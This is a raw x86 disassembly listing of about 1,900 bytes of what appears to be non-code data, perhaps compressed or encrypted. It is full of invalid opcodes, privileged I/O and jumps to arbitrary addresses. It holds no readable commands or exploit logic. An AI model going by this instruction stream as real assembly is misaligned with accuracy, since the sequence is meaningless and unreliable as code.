  42ccc1:	sub    esp,DWORD PTR [edi+0x72d723a8]
  42ccc7:	(bad)  
  42ccc8:	mov    dh,0x3c
  42ccca:	out    dx,eax
  42cccb:	ins    BYTE PTR es:[edi],dx
  42cccc:	ins    DWORD PTR es:[edi],dx
  42cccd:	div    DWORD PTR [eax-0x55f76213]
  42ccd3:	xor    al,0x49
  42ccd5:	test   al,0xe0
  42ccd7:	mov    al,ds:0xfcb23605
  42ccdc:	mov    ah,0x7e
  42ccde:	xchg   edi,eax
  42ccdf:	imul   esi,DWORD PTR [edi+0x5df36e54],0x1c
  42cce6:	mov    al,0xd4
  42cce8:	pop    ebx
  42cce9:	hlt    
  42ccea:	mov    al,ds:0x1b56a518
  42ccef:	jmp    0x42cc93
  42ccf1:	add    BYTE PTR [edx+0x4f39529c],0xc6
  42ccf8:	scas   al,BYTE PTR es:[edi]
  42ccf9:	(bad)  
  42ccfa:	iret   
  42ccfb:	or     dh,BYTE PTR [ebx+0x15e6b8d4]
  42cd01:	ret    0xe52b
  42cd04:	out    0x45,eax
  42cd06:	jo     0x42cd79
  42cd08:	sbb    bl,BYTE PTR [ecx]
  42cd0a:	iret   
  42cd0b:	popa   
  42cd0c:	push   ebp
  42cd0d:	inc    ebp
  42cd0e:	push   esi
  42cd0f:	mov    ch,0x3b
  42cd11:	popf   
  42cd12:	retf   
  42cd13:	jbe    0x42cd3a
  42cd15:	scas   al,BYTE PTR es:[edi]
  42cd16:	test   BYTE PTR [ebp-0x359ae4ee],0x59
  42cd1d:	dec    ecx
  42cd1e:	lods   eax,DWORD PTR ds:[esi]
  42cd1f:	pop    esp
  42cd20:	outs   dx,DWORD PTR ds:[esi]
  42cd21:	rol    ah,1
  42cd23:	inc    esp
  42cd24:	ret    0xbbd0
  42cd27:	mov    WORD PTR ds:0x3df0680c,?
  42cd2d:	inc    ebp
  42cd2e:	shl    BYTE PTR [ecx-0x7946e9],cl
  42cd34:	cmp    DWORD PTR [ecx-0x5cfc0ca3],ebx
  42cd3a:	fwait
  42cd3b:	das    
  42cd3c:	call   0xace3:0x9682d5a7
  42cd43:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42cd45:	data16 mov dl,0xb4
  42cd48:	ins    BYTE PTR es:[edi],dx
  42cd49:	adc    eax,0x19c9f580
  42cd4e:	push   esp
  42cd4f:	xchg   esp,eax
  42cd50:	scas   al,BYTE PTR es:[edi]
  42cd51:	(bad)  
  42cd52:	nop
  42cd53:	push   ebp
  42cd54:	push   es
  42cd55:	pop    ecx
  42cd56:	retf   
  42cd57:	inc    esp
  42cd58:	xor    al,0x82
  42cd5a:	and    ch,BYTE PTR [edx+0x25e6ac4d]
  42cd60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd61:	xor    edi,DWORD PTR [edx+0x3d953c04]
  42cd67:	pop    ebx
  42cd68:	inc    edi
  42cd69:	(bad)  [ebx+0x139c42d8]
  42cd6f:	jp     0x42cd30
  42cd71:	ret    0xeaca
  42cd74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd75:	and    edi,DWORD PTR [esp+edx*2+0x2604b06d]
  42cd7c:	(bad)  
  42cd7d:	(bad)  
  42cd7e:	ins    BYTE PTR es:[edi],dx
  42cd7f:	(bad)  
  42cd80:	and    BYTE PTR [ecx],al
  42cd82:	pop    edx
  42cd83:	sub    bl,ch
  42cd85:	adc    DWORD PTR [ebx],edi
  42cd87:	(bad)  
  42cd88:	and    al,0xa9
  42cd8a:	fcmovnu st,st(3)
  42cd8c:	fmul   QWORD PTR [eax+esi*4-0x646596af]
  42cd93:	xor    eax,0x4fbd916d
  42cd98:	and    DWORD PTR [edx+0x7a],edx
  42cd9b:	scas   al,BYTE PTR es:[edi]
  42cd9c:	popa   
  42cd9d:	fidiv  DWORD PTR [ebx+0x4d9a1524]
  42cda3:	push   ebx
  42cda4:	and    eax,0x6be6f2b6
  42cda9:	in     eax,dx
  42cdaa:	mov    al,0x49
  42cdac:	and    eax,0x327cb409
  42cdb1:	sub    BYTE PTR [edi-0x6a],cl
  42cdb4:	sar    BYTE PTR [ebx+ebp*1],cl
  42cdb7:	add    eax,0xd50bad56
  42cdbc:	sub    BYTE PTR [ecx+0x46],dh
  42cdbf:	jmp    0x42cdee
  42cdc1:	lahf   
  42cdc2:	(bad)
  42cdc6:	out    dx,al
  42cdc7:	daa    
  42cdc8:	int    0xa1
  42cdca:	xchg   DWORD PTR [eiz*2+0x9e68e32],edi
  42cdd1:	mov    dh,0xd
  42cdd3:	push   esi
  42cdd4:	(bad)  
  42cdd5:	dec    ebp
  42cdd6:	xchg   ecx,eax
  42cdd7:	push   edx
  42cdd8:	add    eax,0xb5e9daae
  42cddd:	mov    ebp,0xa985bcb1
  42cde2:	jb     0x42cdcc
  42cde4:	mov    ds:0x1d5d3504,eax
  42cde9:	jmp    0x26dc49cd
  42cdee:	ret    0xa659
  42cdf1:	or     eax,0x1cdb1eec
  42cdf6:	jmp    0x42cdc8
  42cdf8:	jmp    0x4335c214
  42cdfd:	clc    
  42cdfe:	or     DWORD PTR [esi+0x45239fe2],eax
  42ce04:	sbb    al,BYTE PTR [esi]
  42ce06:	lods   eax,DWORD PTR ds:[esi]
  42ce07:	outs   dx,BYTE PTR ds:[esi]
  42ce08:	mov    edx,DWORD PTR [esi]
  42ce0a:	cmp    al,0xdd
  42ce0c:	pop    ds
  42ce0d:	cmp    eax,DWORD PTR [eax+0x42]
  42ce10:	dec    edi
  42ce11:	bound  eax,QWORD PTR [eax]
  42ce13:	jmp    0x6462:0xc5a5b925
  42ce1a:	in     eax,0xd7
  42ce1c:	mov    cs,WORD PTR [esp+ebp*8]
  42ce1f:	adc    eax,0x2017f84a
  42ce24:	mov    esi,0x22f04d1b
  42ce29:	mov    ecx,0x42ffc9cf
  42ce2e:	xchg   DWORD PTR [edi-0x6],ebx
  42ce31:	sbb    esp,0x47
  42ce34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ce35:	jno    0x42cdf9
  42ce37:	repz mov bl,BYTE PTR [esi-0x50]
  42ce3b:	sub    al,0x8c
  42ce3d:	imul   ecx,eax,0x3bdc4f00
  42ce43:	(bad)  
  42ce45:	and    eax,0x7646fabc
  42ce4a:	(bad)  [eax]
  42ce4c:	push   0xe8d389c3
  42ce51:	sar    BYTE PTR [edx-0x42baf9ce],cl
  42ce57:	je     0x42ce2f
  42ce59:	popf   
  42ce5a:	xlat   BYTE PTR ds:[ebx]
  42ce5b:	or     ch,dl
  42ce5d:	scas   al,BYTE PTR es:[edi]
  42ce5e:	and    ebx,esi
  42ce60:	add    dl,dl
  42ce62:	cld    
  42ce63:	or     DWORD PTR [eax+0x6b],ebx
  42ce66:	adc    BYTE PTR [esi+0x3c4b191c],bl
  42ce6c:	(bad)  
  42ce6d:	imul   BYTE PTR [esi]
  42ce6f:	mov    dl,0x95
  42ce71:	jl     0xa7507763
  42ce77:	mov    esi,0x4a2b3a41
  42ce7c:	ds test eax,0xa806259d
  42ce82:	out    0x98,eax
  42ce84:	pop    es
  42ce85:	gs sti 
  42ce87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ce88:	and    eax,0x5fe53815
  42ce8d:	mov    ebx,0xd94d1a8e
  42ce92:	xchg   ecx,eax
  42ce93:	sti    
  42ce94:	ja     0x42ce3a
  42ce96:	adc    dl,bl
  42ce98:	and    BYTE PTR [esi],bh
  42ce9a:	push   ds
  42ce9b:	bound  ebp,QWORD PTR [ebp+ebx*8-0x6e]
  42ce9f:	clc    
  42cea0:	push   esi
  42cea1:	aam    0xb2
  42cea3:	add    dl,dl
  42cea5:	into   
  42cea6:	push   edi
  42cea7:	xchg   sp,ax
  42cea9:	test   eax,0x891f6fe0
  42ceae:	sbb    DWORD PTR [edi+esi*1-0x33],ecx
  42ceb2:	int    0x80
  42ceb4:	mov    bl,BYTE PTR [esi-0x3c9732a5]
  42ceba:	mov    al,ds:0x98106414
  42cebf:	xor    ebx,DWORD PTR [eax+eax*4-0x62c70b44]
  42cec6:	call   0xbec95449
  42cecb:	out    dx,eax
  42cecc:	jl     0x42ce73
  42cece:	shl    ecx,0x22
  42ced1:	fldcw  WORD PTR [esi-0x74]
  42ced4:	in     al,0x7d
  42ced6:	dec    ebx
  42ced7:	push   eax
  42ced8:	in     al,0x26
  42ceda:	rdpmc  
  42cedc:	fstp   st(4)
  42cede:	retf   0xd6d7
  42cee1:	out    0xb0,eax
  42cee3:	cmp    al,0x28
  42cee5:	das    
  42cee6:	fs mov ebp,0xa4bb6267
  42ceec:	add    ecx,eax
  42ceee:	inc    eax
  42ceef:	mul    DWORD PTR [ebp-0x2713e19c]
  42cef5:	popf   
  42cef6:	pop    ds
  42cef7:	iret   
  42cef8:	repz mov dl,BYTE PTR [edx+0x38]
  42cefc:	and    esp,DWORD PTR [ecx]
  42cefe:	jnp    0x42ce92
  42cf00:	jmp    0x42ce86
  42cf02:	test   eax,0x7d25f73e
  42cf07:	aad    0xf5
  42cf09:	sbb    bh,dl
  42cf0b:	out    0xf7,eax
  42cf0d:	cmp    ah,0x90
  42cf10:	into   
  42cf11:	push   ebx
  42cf12:	in     al,dx
  42cf13:	fs cwde 
  42cf15:	and    dh,BYTE PTR [edi]
  42cf17:	test   al,0x18
  42cf19:	popf   
  42cf1a:	imul   ebp,DWORD PTR [esi-0x18],0xffffff9e
  42cf1e:	mov    ds:0xf383ab90,al
  42cf23:	mov    ds,WORD PTR [esi-0x76]
  42cf26:	mov    WORD PTR [esi-0x1f478045],es
  42cf2c:	arpl   WORD PTR [ebx+ebx*8-0x43a3b8d5],bx
  42cf33:	in     al,dx
  42cf34:	cli    
  42cf35:	sub    eax,0x7c358a5f
  42cf3a:	mov    ecx,0xa465ada4
  42cf3f:	mov    eax,0xe96b2e35
  42cf44:	and    eax,0xe6286197
  42cf49:	mov    edx,0x511de722
  42cf4e:	stos   BYTE PTR es:[edi],al
  42cf4f:	mov    eax,edx
  42cf51:	push   edx
  42cf52:	push   ebx
  42cf53:	push   ecx
  42cf54:	xchg   esi,eax
  42cf55:	pop    esi
  42cf56:	mov    ss,WORD PTR [esi]
  42cf58:	aas    
  42cf59:	mov    esi,0x8a808b61
  42cf5e:	mov    bh,0xec
  42cf60:	sbb    DWORD PTR [ecx+0x3f],ecx
  42cf63:	loopne 0x42cf8d
  42cf65:	push   0xfffffffa
  42cf67:	js     0x42cfca
  42cf69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cf6a:	stos   DWORD PTR es:[edi],eax
  42cf6b:	test   eax,esi
  42cf6d:	mov    ebp,0xe7b01ace
  42cf72:	in     al,dx
  42cf73:	push   DWORD PTR [eax+0x72]
  42cf76:	mov    ecx,0x32cf63c4
  42cf7b:	stc    
  42cf7c:	(bad)  
  42cf7d:	lock gs leave 
  42cf80:	(bad)  
  42cf81:	sbb    edi,DWORD PTR [eax]
  42cf83:	ret    
  42cf84:	xlat   BYTE PTR ds:[bx]
  42cf86:	mov    eax,0xa93ca492
  42cf8b:	cmc    
  42cf8c:	jle    0x42cfb7
  42cf8e:	push   ecx
  42cf8f:	cmp    BYTE PTR ds:0x757bd81,bl
  42cf95:	mov    al,ds:0x87a238b
  42cf9a:	das    
  42cf9b:	lods   eax,DWORD PTR ds:[esi]
  42cf9c:	add    BYTE PTR [edi+0x12a8cdbe],cl
  42cfa2:	mov    cl,0xc4
  42cfa4:	mov    cl,0x20
  42cfa6:	adc    ah,BYTE PTR [esi+0x339fbbc6]
  42cfac:	fsub   DWORD PTR [edi-0x64c3cddd]
  42cfb2:	push   esi
  42cfb3:	scas   al,BYTE PTR es:[edi]
  42cfb4:	push   ecx
  42cfb5:	jge    0x42cf74
  42cfb7:	adc    al,0x96
  42cfb9:	repz jl 0x42cfd9
  42cfbc:	(bad)  
  42cfbd:	aam    0x9e
  42cfbf:	and    DWORD PTR [ebp+0x3ec18dd1],esi
  42cfc5:	popf   
  42cfc6:	mov    esi,0xbde9b2be
  42cfcb:	and    al,0x4f
  42cfcd:	push   es
  42cfce:	adc    DWORD PTR [ebx-0x123b06fb],eax
  42cfd4:	xchg   DWORD PTR [eax-0x76e98e08],eax
  42cfda:	aam    0x5
  42cfdc:	xor    DWORD PTR [edi-0x63b6b2d4],ebp
  42cfe2:	fist   DWORD PTR [edx]
  42cfe4:	popa   
  42cfe5:	xor    eax,0x4aa4bdfd
  42cfea:	ret    0xcee8
  42cfed:	push   cs
  42cfee:	(bad)  
  42cfef:	and    al,0xcc
  42cff1:	push   ss
  42cff2:	pop    ecx
  42cff3:	mov    al,0x2c
  42cff5:	call   0xe27:0x389a32bb
  42cffc:	jp     0x42cfd5
  42cffe:	xchg   edx,eax
  42cfff:	pop    ds
  42d000:	stc    
  42d001:	enter  0x43be,0x79
  42d005:	adc    bh,BYTE PTR [esi-0x429f23ac]
  42d00b:	stos   DWORD PTR es:[edi],eax
  42d00c:	gs dec ecx
  42d00e:	push   0xffffffe8
  42d010:	mov    ah,0x87
  42d012:	pop    es
  42d013:	lods   eax,DWORD PTR ds:[esi]
  42d014:	sbb    ecx,DWORD PTR [ecx-0x54313b5f]
  42d01a:	cli    
  42d01b:	and    eax,DWORD PTR [ebx-0x60]
  42d01e:	mov    ecx,DWORD PTR [ecx]
  42d020:	jmp    0x93e2:0x4e82e209
  42d027:	lds    ebp,FWORD PTR [eax-0x75]
  42d02a:	mov    dh,0xb4
  42d02c:	lds    ecx,FWORD PTR [ecx-0x274ad1cd]
  42d032:	out    dx,eax
  42d033:	hlt    
  42d034:	xchg   esp,eax
  42d035:	(bad)  
  42d036:	loope  0x42d05d
  42d038:	sbb    eax,0x568ce563
  42d03d:	outs   dx,DWORD PTR ds:[esi]
  42d03e:	pop    edx
  42d03f:	int3   
  42d040:	and    al,0x7b
  42d042:	imul   esi,DWORD PTR [eax+edx*1+0x52],0xffffffef
  42d047:	sbb    BYTE PTR [eax+ebx*1],bh
  42d04a:	push   ebp
  42d04b:	mov    bl,0x68
  42d04d:	leave  
  42d04e:	mov    ecx,0xac1a79f4
  42d053:	scas   al,BYTE PTR es:[edi]
  42d054:	push   es
  42d055:	jge    0x42d0bb
  42d057:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d058:	pop    es
  42d059:	repnz mov esp,0xbbd871aa
  42d05f:	data16 cmp dl,BYTE PTR [edi-0x5c2c81da]
  42d066:	mov    bl,0xf4
  42d068:	lahf   
  42d069:	icebp  
  42d06a:	in     eax,0x28
  42d06c:	dec    di
  42d06e:	fcomp  QWORD PTR [edx]
  42d070:	push   esi
  42d071:	sbb    al,0x55
  42d073:	or     al,0x65
  42d075:	sbb    DWORD PTR [edx-0x616a972f],esi
  42d07b:	xchg   eax,edx
  42d07d:	out    0xbf,eax
  42d07f:	add    al,0x45
  42d081:	mov    al,ds:0x4236bfdb
  42d086:	inc    esi
  42d087:	inc    esp
  42d088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d089:	call   DWORD PTR [ebx-0x4af31919]
  42d08f:	aam    0x18
  42d091:	es jno 0x42d038
  42d094:	in     eax,0xb9
  42d096:	sub    dh,cl
  42d098:	push   esp
  42d099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d09a:	add    al,0x6
  42d09c:	and    cl,bh
  42d09e:	push   cs
  42d09f:	sbb    BYTE PTR [edi+ebp*4-0x611b0087],0x7b
  42d0a7:	test   BYTE PTR [esi],dh
  42d0a9:	jl     0x42d10a
  42d0ab:	in     eax,0xa7
  42d0ad:	mov    esp,0x9eaeda09
  42d0b2:	in     eax,dx
  42d0b3:	hlt    
  42d0b4:	cmp    al,0xa3
  42d0b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d0b7:	mov    bl,0x9c
  42d0b9:	sub    BYTE PTR [eax+0x52],dl
  42d0bc:	pop    ds
  42d0bd:	jns    0x42d048
  42d0bf:	or     cl,al
  42d0c1:	ds mov ebp,0xde791909
  42d0c7:	stos   DWORD PTR es:[edi],eax
  42d0c8:	xchg   BYTE PTR es:[edi-0x4460926f],dl
  42d0cf:	data16 add al,0x87
  42d0d2:	es push 0xafc421b1
  42d0d8:	loop   0x42d09b
  42d0da:	mov    edx,0x55903aa4
  42d0df:	mov    ebp,0xf36b9275
  42d0e4:	shl    dh,1
  42d0e6:	hlt    
  42d0e7:	and    DWORD PTR [ebp+0x213c144b],eax
  42d0ed:	mov    ecx,0xab7ff678
  42d0f2:	pop    es
  42d0f3:	mov    ds:0xef1894e5,al
  42d0f8:	pop    esi
  42d0f9:	pop    edx
  42d0fa:	hlt    
  42d0fb:	stc    
  42d0fc:	and    ecx,DWORD PTR [ecx+0x6368fb86]
  42d102:	add    DWORD PTR [eax-0x69c5898e],edx
  42d108:	and    BYTE PTR [esi+0x78a221fb],ah
  42d10e:	xlat   BYTE PTR ds:[ebx]
  42d10f:	jecxz  0x42d109
  42d111:	sub    ebp,DWORD PTR [edx+0x3e]
  42d114:	push   0xe214b04a
  42d119:	in     eax,0x18
  42d11b:	add    BYTE PTR [esi],al
  42d11d:	inc    ebx
  42d11e:	rcr    BYTE PTR [ecx+0x52f23a0e],1
  42d124:	jecxz  0x42d156
  42d126:	mov    edx,0xb22920ac
  42d12b:	mov    bh,0xe8
  42d12d:	mov    dh,0x1
  42d130:	hlt    
  42d131:	mov    edx,0x17f2f6bb
  42d136:	stos   DWORD PTR es:[edi],eax
  42d137:	fwait
  42d138:	pop    ss
  42d139:	and    DWORD PTR [edi+0x3f97fee1],0xb7415ddf
  42d143:	adc    al,0x22
  42d145:	cs jns 0x42d0f0
  42d148:	push   ss
  42d149:	rol    DWORD PTR [esp+eiz*2-0x74a96363],cl
  42d150:	push   es
  42d151:	(bad)  
  42d152:	jmp    0x73e15976
  42d157:	xchg   esi,eax
  42d158:	dec    edx
  42d159:	cli    
  42d15a:	mov    ebx,0xdbb84f44
  42d15f:	mul    BYTE PTR [ebp-0x7e46108d]
  42d165:	and    ebp,DWORD PTR [edx]
  42d167:	cwde   
  42d168:	inc    edi
  42d169:	pop    ecx
  42d16a:	add    DWORD PTR [ebx-0x71becbd9],ebp
  42d170:	add    al,0x38
  42d172:	jnp    0x42d1db
  42d174:	push   ebp
  42d175:	popf   
  42d176:	xor    ecx,0x976095b6
  42d17c:	mov    ecx,cs
  42d17e:	fbstp  TBYTE PTR [edi+esi*1]
  42d181:	push   ebp
  42d182:	xchg   ebx,eax
  42d183:	adc    eax,0xd023d61a
  42d188:	pop    ebx
  42d189:	(bad)  
  42d18a:	fisttp DWORD PTR [edx-0x3443a4f7]
  42d190:	and    eax,0x2d050266
  42d195:	fst    DWORD PTR [ebp-0x156a942c]
  42d19b:	dec    ebp
  42d19c:	pop    ss
  42d19d:	in     eax,0xab
  42d19f:	add    eax,0xe6d6eb45
  42d1a4:	sar    DWORD PTR [ebp+0xa],1
  42d1a7:	mov    ebp,0xbf508986
  42d1ac:	repz pop ebp
  42d1ae:	jns    0x42d18b
  42d1b0:	xchg   ebp,eax
  42d1b1:	adc    BYTE PTR [ebx-0xd],ch
  42d1b4:	out    dx,al
  42d1b5:	xchg   ebx,eax
  42d1b6:	dec    esp
  42d1b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d1b8:	fild   WORD PTR [edx+0x24]
  42d1bb:	mov    ch,0xf1
  42d1bd:	shl    DWORD PTR [edx+ecx*8-0x5fb3c864],1
  42d1c4:	pusha  
  42d1c5:	cmp    cl,al
  42d1c7:	push   esp
  42d1c8:	imul   ebx,DWORD PTR [ebp-0x3],0xcd36169b
  42d1cf:	retf   0x8cd5
  42d1d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d1d3:	out    dx,eax
  42d1d4:	dec    esi
  42d1d5:	add    eax,0xa9217839
  42d1da:	clc    
  42d1db:	push   ss
  42d1dc:	ins    DWORD PTR es:[edi],dx
  42d1dd:	inc    ebx
  42d1de:	pop    edi
  42d1df:	mov    ebp,ecx
  42d1e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d1e2:	pop    ebx
  42d1e3:	xor    al,0x8e
  42d1e5:	and    BYTE PTR [ecx],dh
  42d1e7:	mov    dl,0x94
  42d1e9:	jg     0x42d1ff
  42d1eb:	sub    BYTE PTR [eax-0x78],0x54
  42d1ef:	push   0xcb1ba3dd
  42d1f4:	shl    BYTE PTR [ecx+ecx*4+0x2fde4533],1
  42d1fb:	in     al,dx
  42d1fc:	mov    ecx,0x89a71c2b
  42d201:	or     DWORD PTR [edi+edi*8-0x123c3ee9],ecx
  42d208:	sub    esp,edi
  42d20a:	mov    al,0x57
  42d20c:	mov    ch,0x77
  42d20e:	mov    gs,edx
  42d210:	push   ds
  42d211:	(bad)
  42d214:	and    al,0x79
  42d216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d217:	bound  edi,QWORD PTR fs:0xa8a204ff
  42d21e:	imul   edi,DWORD PTR [eax-0x5bad1eed],0xe
  42d225:	mov    ch,0x93
  42d227:	xchg   ebp,eax
  42d228:	pushf  
  42d229:	sahf   
  42d22a:	jnp    0x42d205
  42d22c:	ss or  dl,dl
  42d22f:	pop    ecx
  42d230:	nop
  42d231:	rcr    BYTE PTR [ebx-0xd],cl
  42d234:	sub    edi,DWORD PTR [esi+0x31a3d1f7]
  42d23a:	xlat   BYTE PTR ds:[ebx]
  42d23b:	cmp    ah,bl
  42d23d:	pushf  
  42d23e:	cwde   
  42d23f:	fisub  WORD PTR ds:0x10b70959
  42d245:	sub    cl,0x96
  42d248:	sbb    BYTE PTR [ecx-0x4941b5b5],0x3b
  42d24f:	test   DWORD PTR [ecx],ebp
  42d251:	in     al,0x50
  42d253:	inc    esi
  42d254:	hlt    
  42d255:	fbstp  TBYTE PTR [edi+0x6e8ce714]
  42d25b:	lock aad 0x4e
  42d25e:	jecxz  0x42d251
  42d260:	mov    al,0x6
  42d262:	push   0x95d922a5
  42d267:	jge    0x42d288
  42d269:	and    cl,bh
  42d26b:	bound  ecx,QWORD PTR [eax]
  42d26d:	push   DWORD PTR [bp+0x611f]
  42d272:	mov    ds:0x3d27659d,eax
  42d277:	ficomp DWORD PTR [eax]
  42d279:	stc    
  42d27a:	sbb    ah,BYTE PTR [ecx+0x68]
  42d27d:	jmp    0x8617671b
  42d282:	pop    edi
  42d283:	outs   dx,BYTE PTR ds:[esi]
  42d284:	sbb    DWORD PTR [ecx],esp
  42d286:	push   ss
  42d287:	imul   ecx,DWORD PTR [esi],0xf05fca60
  42d28d:	or     al,0x27
  42d28f:	jns    0x42d250
  42d291:	push   0x7a
  42d293:	(bad)  [edi+0x0]
  42d296:	mov    ch,0x7c
  42d298:	and    al,0xa4
  42d29a:	imul   ebx,DWORD PTR [edi-0x4662ac60],0xffffffa8
  42d2a1:	test   BYTE PTR [esi-0x19],0x90
  42d2a5:	pop    ds
  42d2a6:	mov    edx,0xc59ef6a4
  42d2ab:	adc    eax,0xed398645
  42d2b0:	pop    ebx
  42d2b1:	js     0x42d327
  42d2b3:	sti    
  42d2b4:	pop    ds
  42d2b5:	mov    ecx,esi
  42d2b7:	mov    bh,0x7
  42d2b9:	ss pop es
  42d2bb:	pop    edx
  42d2bc:	shl    DWORD PTR [edi+edi*2],1
  42d2bf:	lock fild QWORD PTR [ebx-0xc1a2f1f]
  42d2c6:	ret    
  42d2c7:	in     al,dx
  42d2c8:	call   0x6f8e:0x13395f02
  42d2cf:	sbb    dh,ch
  42d2d1:	stos   BYTE PTR es:[edi],al
  42d2d2:	mov    ebx,edx
  42d2d4:	pop    ds
  42d2d5:	mov    ecx,0xafa6b468
  42d2da:	push   esi
  42d2db:	dec    ebp
  42d2dc:	cmp    DWORD PTR ds:0xc9f1710e,esp
  42d2e2:	mov    ecx,0x96da267c
  42d2e7:	mov    ah,0x46
  42d2e9:	mov    WORD PTR [ebx+0x75eb51d4],?
  42d2ef:	aam    0x5
  42d2f1:	pop    ss
  42d2f2:	test   ebx,esi
  42d2f4:	mov    cl,BYTE PTR [ebp+0x391ae3a1]
  42d2fa:	adc    BYTE PTR [edi],ah
  42d2fc:	dec    esp
  42d2fd:	cld    
  42d2fe:	jle    0x42d31a
  42d300:	or     eax,0x8fb13d89
  42d305:	adc    bh,BYTE PTR [eax+0xf86654b]
  42d30b:	arpl   sp,bx
  42d30d:	arpl   WORD PTR [eax+ecx*1-0xefe983d],di
  42d314:	fnstsw WORD PTR [edi]
  42d316:	scas   al,BYTE PTR es:[edi]
  42d317:	adc    eax,0xf2c35a9f
  42d31c:	std    
  42d31d:	mov    ds:0x2a0e08cb,eax
  42d322:	ins    BYTE PTR es:[edi],dx
  42d323:	hlt    
  42d324:	xor    cl,bl
  42d326:	ss inc ebx
  42d328:	sbb    BYTE PTR [edi-0x62],0x96
  42d32c:	add    ch,dl
  42d32e:	mov    bl,0x4c
  42d330:	push   ds
  42d331:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d332:	retf   
  42d333:	stos   DWORD PTR es:[edi],eax
  42d334:	mov    ecx,DWORD PTR [ebx+0x54]
  42d337:	or     al,0xfb
  42d339:	call   0xa557a854
  42d33e:	mov    edx,0xc92f8974
  42d343:	fbstp  TBYTE PTR ds:0xbf28e92
  42d349:	retf   
  42d34a:	fdiv   QWORD PTR [eax-0x575d6dd]
  42d350:	repnz hlt 
  42d352:	(bad)  [ecx]
  42d354:	popa   
  42d355:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d356:	retf   
  42d357:	out    0xf7,al
  42d359:	enter  0xa5d8,0x9a
  42d35d:	jne    0x42d340
  42d35f:	xchg   edx,eax
  42d360:	sbb    dl,dl
  42d362:	mov    bl,0xc4
  42d364:	push   esp
  42d365:	mov    dl,0x86
  42d367:	inc    eax
  42d368:	in     eax,0xff
  42d36a:	sub    eax,esi
  42d36c:	jo     0x42d313
  42d36e:	dec    esp
  42d36f:	jns    0x42d38a
  42d371:	dec    ecx
  42d372:	xor    bl,cl
  42d374:	mov    BYTE PTR [eax-0x67],ah
  42d377:	or     ebx,DWORD PTR fs:[edx-0x726a3525]
  42d37e:	adc    eax,0x2235386a
  42d383:	js     0x42d343
  42d385:	fdiv   QWORD PTR [esi-0x20ac8e7c]
  42d38b:	add    DWORD PTR [edi-0x4b],0x9b347402
  42d392:	jle    0x42d3e4
  42d394:	xchg   esi,eax
  42d395:	pop    ss
  42d396:	mov    ah,0x94
  42d398:	fdiv   DWORD PTR ds:0xee6527de
  42d39e:	outs   dx,DWORD PTR ds:[esi]
  42d39f:	jmp    0x4924:0xc26b9522
  42d3a6:	(bad)  
  42d3a7:	lock pop edi
  42d3a9:	ret    
  42d3aa:	lock and eax,0x445bb55f
  42d3b0:	xor    al,BYTE PTR [edx]
  42d3b2:	enter  0x52ff,0x1e
  42d3b6:	push   0xffffff9c
  42d3b8:	and    eax,0x1c464489
  42d3bd:	or     dl,0x53
  42d3c0:	stos   DWORD PTR es:[edi],eax
  42d3c1:	int    0xab
  42d3c3:	adc    al,0xab
  42d3c5:	ror    BYTE PTR [ebx+0x4fd61d76],0x42
  42d3cc:	sbb    al,0xc9
  42d3ce:	mov    ebx,0x1e3cf6f7
  42d3d3:	nop
  42d3d4:	pop    ebx
  42d3d5:	cmp    eax,0x411b73cf
  42d3da:	xor    al,BYTE PTR [edx+0x39]
  42d3dd:	mov    edi,0xea5671e6
  42d3e2:	mov    dl,0x49
  42d3e4:	iret   
  42d3e5:	adc    DWORD PTR [eax+edx*4+0x492ff555],ebp
  42d3ec:	xlat   BYTE PTR ds:[ebx]
  42d3ed:	ret    0x7bbc
  42d3f0:	test   DWORD PTR [edi],ebp
  42d3f2:	sub    ebp,ebp
  42d3f4:	add    eax,0xfd958b0b
  42d3f9:	addr16 push esp
  42d3fb:	adc    eax,0xe4b490df
  42d400:	mov    ds:0x67b9f003,al
  42d405:	(bad)  [ebx-0xc17223a]
  42d40b:	in     eax,dx
  42d40c:	add    DWORD PTR [ecx-0x53],0xffffffe5
  42d410:	sbb    BYTE PTR [ecx-0x69],ch
  42d413:	cld    
  42d414:	mov    eax,0xf3cfee68
  42d419:	call   0x5601:0x1e4a52b
  42d420:	inc    ebp
  42d421:	mov    dl,0x5c
  42d423:	mov    esi,0x4b9e7de
  42d428:	popa   
  42d429:	jbe    0x42d475
  42d42b:	daa    
  42d42c:	and    eax,0xe4eaaa19
  42d431:	in     eax,dx
  42d432:	daa    
  42d433:	out    0x83,al
  42d435:	pop    es
  42d436:	int3   
  42d437:	lar    edi,WORD PTR [ebx+0x34]
  42d43b:	sahf   
  42d43c:	sbb    eax,0x6a0452f5
  42d441:	mov    WORD PTR [ecx+0x7d],fs
  42d444:	loop   0x42d4af
  42d446:	sbb    esi,0xd7abbf22
  42d44c:	clc    
  42d44d:	into   
  42d44e:	inc    eax
  42d44f:	aaa    
  42d450:	popa   
  42d451:	jp     0x42d411
  42d453:	aas    
  42d454:	dec    edi
  42d455:	rcr    DWORD PTR [ebx+0x41f37b92],cl
  42d45b:	mov    ds:0x6f2f56cf,eax
  42d460:	and    eax,0x73ee12d4
  42d465:	add    eax,0x904d739
  42d46a:	fcmovb st,st(0)
  42d46c:	mov    edx,0xed64bde0
  42d471:	call   0xa3b26be0
  42d476:	pop    ebx
  42d477:	ins    DWORD PTR es:[edi],dx
  42d478:	lds    edx,FWORD PTR [ebx-0x1ba425a9]
  42d47e:	gs lock push ss
  42d481:	mov    edx,edi
  42d483:	sar    BYTE PTR [esi+ebp*4],cl
  42d486:	in     eax,dx
  42d487:	cmp    al,0x60
  42d489:	jle    0x42d41e
  42d48b:	sbb    edi,DWORD PTR [ebx-0x5d]
